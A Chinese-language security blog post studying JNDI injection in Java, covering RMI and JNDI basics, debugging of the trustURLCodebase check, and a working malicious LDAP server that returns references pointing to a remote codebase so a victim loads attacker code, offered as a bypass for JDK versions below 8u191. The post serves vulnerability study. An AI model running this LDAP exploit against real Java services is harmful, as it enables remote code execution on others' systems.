---
layout: post
title: JNDI注入学习(一)
tags: java Web安全
typora-copy-images-to: ../assets/img
typora-root-url: ..
---

# JNDI注入学习(一)

## 关于RMI

Java RMI(Java Remote Method Invocation),用来实现远程过程调用(Remote Procedure Call)的应用程序编程接口。允许在一个JVM中调用另一个JVM中的远程对象。

RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。

通常一个RMI应用程序：

1. 创建远程接口：继承java.rmi.Remote接口,接口中的所有方法声明抛出java.rmi.RemoteException。

2. 创建远程类：实现远程接口。同时要使这个类的实例能导出(export)为远程对象。其中有两种办法

   - 继承java.rmi.server.UnicastRemoteObject类，同时构造方法抛出RemoteException

     ```java
     public class RemoteImpl extends UnicastRemoteObject implements RemoteInterface
     ```

   - 如果已经继承了其他类，无法继承UnicastRemoteObject类，可以在构造方法中调UnicastRemoteObject类的静态exportObject()方法，同样，远程类的构造方法也必须声明抛出RemoteException。

3. 创建服务器程序：创建远程对象，通过createRegistry()方法注册远程对象。并通过bind或者rebind方法，把远程对象绑定到指定名称空间（URL）中.

   ```java
   RemoteInterface remoteObj2 = new RemoteImpl();// 创建远程对象
   Context namingContext = new InitialContext();// 初始化命名内容
   LocateRegistry.createRegistry(8892);// 在本地主机上创建和导出注册表实例，并在指定的端口上接受请求
   namingContext.rebind("rmi://localhost:8892/RemoteObj2", remoteObj2);// 注册对象，即把对象与一个名字绑定。
   ```

4. 创建客户程序：通过 lookup()方法查找远程对象，进行远程方法调用 

   ```java
   Context namingContext = new InitialContext();// 初始化命名内容
   RemoteInterface RmObj2 = (RemoteInterface) namingContext.lookup("rmi://localhost:8892/RemoteObj2");//获得远程对象的存根对象
   System.out.println(RmObj2.doSomething());
   ```

### RMI如何实现:

从逻辑上来看，数据是在Client和Server之间横向流动的，但是实际上是从Client到Stub，然后从Skeleton到Server这样纵向流动的。

也就是说其实我们本地并没有真正拿到这样一个对象，而只是拿到了这个对象的Stub，其中包含了远程对象的调用信息（端口和IP，这里的端口与我们的RMI Registry的固定端口不同，是随机的），当我们在本地调用的时候，就会连接到Server端向Skeleton提供参数，Server端将结果返回给客户端。

#### 调用过程：

- 当客户端通过RMI注册表找到一个远程接口的时候，所得到的其实是远程接口的一个动态代理对象。
- 当客户端调用其中的方法的时候，方法的参数对象会在**序列化**之后，传输到服务器端。
- 服务器端接收到之后，进行反序列化得到参数对象。并使用这些参数对象，在服务器端调用实际的方法。
- 调用的返回值Java对象经过序列化之后，再发送回客户端。
- 客户端再经过反序列化之后得到Java对象，返回给调用者。这中间的序列化过程对于使用者来说是透明的，由动态代理对象自动完成。



![1564297072426](/assets/img/1564297072426.png)

从客户端的角度来看，其实服务器端是有两个接口，一个是Registry接口，这里的端口是固定的（默认1099），还有一个就是通信对象的随机端口(随机分配的)。

![1564297413938](assets/img/1564297413938.png)

### 关于JDNI

JNDI (Java Naming and Directory Interface) 是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。

**JNDI 的接口就可以存取 RMI Registry/LDAP/DNS/NIS 等所谓 Naming Service 或 DirectoryService 的内容**

#### 如何造成JNDI注入,利用Reference

这里其实有一个疑惑，作为客户端来说，本地存放的是stub代理，最终执行方法是在服务器端，那么在客户端如何造成RCE呢?

```
在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。我们可以将恶意代码放在被远程调用类的构造方法中，就会触发漏洞
```

#### 动态调试与高版本jdk的绕过分析

环境:jdk1.8_181

源码映射可以在openjdk上下载

在lookup处下断点，由于是rmi协议，

一路跟进到`com.sun.jndi.rmi.registry.RegistryContext#lookup(javax.naming.Name)`

![1565063027382](/assets/img/1565063027382.png)

可以看到主要有两个关键的地方，一个从registry获取到一个Remote实例，然后对这个remote实例进行了decodeObeject的操作。

先跟进registry的lookup操作

![1565064167371](/assets/img/1565064167371.png)

接着进入decodeObject方法，`com.sun.jndi.rmi.registry.RegistryContext#decodeObject`

这个方法首先对是否是reference类型进行了判断，如果是reference类型的话，在trustURLCodebase关闭的情况下就会抛出ConfigurationException异常，在JDK1.8u113之后trustURLCodebase默认为false。

![1565075377588](/assets/img/1565075377588.png)

这里对于JDK8u191以下的版本可以采用LDAP来绕过，网上的一份使用com.unboundid.ldap的exp

```java
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;


public class LdapServer {

    private static final String LDAP_BASE = "dc=example,dc=com";


    public static void main (String[] args) {

        String url = "http://127.0.0.1:8000/#EvilObject";
        int port = 1234;


        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;


        /**
         *
         */
        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }


        /**
         * {@inheritDoc}
         *
         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */
        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }

        }


        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "Exploit");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference");
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}
```

执行可以看到虽然报错，但是依然执行了写在构造函数里的命令

![1569060088328](/assets/img/1569060088328.png)

可以看到，这里的攻击思路都是通过codebase加载远程对象并且进行实例化来实现的，下一篇分析整理一下加载classpath下存在的类的一些攻击思路

> 参考文章

[BLACKHAT 2016-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)

[Java RMI远程方法调用详解](https://blog.csdn.net/guyuealian/article/details/51992182)

[深入理解JNDI注入与Java反序列化漏洞利用 ---KINGX](https://mp.weixin.qq.com/s?__biz=MzAxNTg0ODU4OQ==&mid=2650358440&idx=1&sn=e005f721beb8584b2c2a19911c8fef67&chksm=83f0274ab487ae5c250ae8747d7a8dc7d60f8c5bdc9ff63d0d930dca63199f13d4648ffae1d0&scene=21#wechat_redirect)

[如何绕过高版本 JDK 的限制进行 JNDI 注入利用](<https://paper.seebug.org/942/>)

[java代码审计学习之jndi注入](<https://www.smi1e.top/java%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1%e5%ad%a6%e4%b9%a0%e4%b9%8bjndi%e6%b3%a8%e5%85%a5/>)